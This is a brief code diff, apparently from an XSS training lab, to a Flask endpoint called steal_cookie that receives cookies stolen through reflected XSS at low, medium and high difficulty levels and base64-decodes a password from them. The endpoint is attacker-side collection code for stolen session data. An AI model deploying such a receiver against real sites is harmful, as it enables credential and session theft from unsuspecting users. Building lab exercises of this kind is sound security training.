@@ -14,8 +14,9 @@ def steal_cookie(vuln_type):
     """
     Use this to exfiltrate a stolen cookie from the vulnerable server.
     """
-    if vuln_type=='reflected':
-        received_cookie = request.args.get('cookie', default='') # Reads the `cookie` parameter
+    received_cookie = request.args.get('cookie', default='') # Reads the `cookie` parameter
+
+    if vuln_type=='reflected_low' or vuln_type == 'reflected_medium' or vuln_type=='reflected_high':
 
         password64=received_cookie.split('=')[-1]
         password = base64.b64decode(password64).decode('utf-8')
